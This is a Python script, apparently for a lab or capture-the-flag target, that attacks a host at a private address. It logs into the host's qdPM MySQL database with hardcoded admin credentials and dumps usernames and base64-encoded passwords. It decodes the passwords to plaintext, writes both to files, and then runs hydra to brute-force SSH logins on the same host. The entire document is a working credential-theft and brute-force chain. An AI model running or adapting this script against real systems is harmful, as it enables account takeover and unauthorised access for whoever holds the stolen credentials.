from time import sleep

import mysql.connector
import base64
import os
from pathlib import Path

HOST = '192.168.1.179'
DATABASE = 'staff'
DBUSER = 'qdpmadmin'
DBPASS = 'UcVQCMQk2STVeS6J'
WDIR=str(Path.cwd())
USER_FILE = WDIR + "/out/user.txt"
PASS_FILE = WDIR + "/out/pass.txt"
LOGINS_FILE = WDIR + "/out/logins.txt"



def create_file(FILE):
    file = open(FILE, "w")
    return file


def decrypt_base64(base64_pass):
    uncpass = base64.b64decode(base64_pass)
    return uncpass


def mysql_select(user_file, pass_file):


    try:
        connection = mysql.connector.connect(host=HOST,
                                            database=DATABASE,
                                            user=DBUSER,
                                            password=DBPASS)


        sql_select_Query = "select * from user join login on (login.user_id = user.id);"
        cursor = connection.cursor()
        cursor.execute(sql_select_Query)
        # get all records
        records = cursor.fetchall()

        for row in records:
            uncpass = base64.b64decode(row[6])
            #print(row[2], uncpass)
            user = row[2] + "\n"
            user_file.write(user.lower())
            pass_file.write(str(uncpass, 'utf-8') + "\n")


    except mysql.connector.Error as e:
        print("Error reading data from MySQL table", e)
    finally:
        if connection.is_connected():
            connection.close()
            cursor.close()
            print("MySQL connection is closed")


def main():
    user_file = create_file(USER_FILE)
    pass_file = create_file(PASS_FILE)
    mysql_select(user_file, pass_file)
    user_file.close()
    pass_file.close()
    cmd_hydra = '/usr/bin/hydra -L {} -P {} -o {} ssh://{}'.format(USER_FILE, PASS_FILE, LOGINS_FILE, HOST)
    os.system(cmd_hydra)

if __name__ == "__main__":
    main()
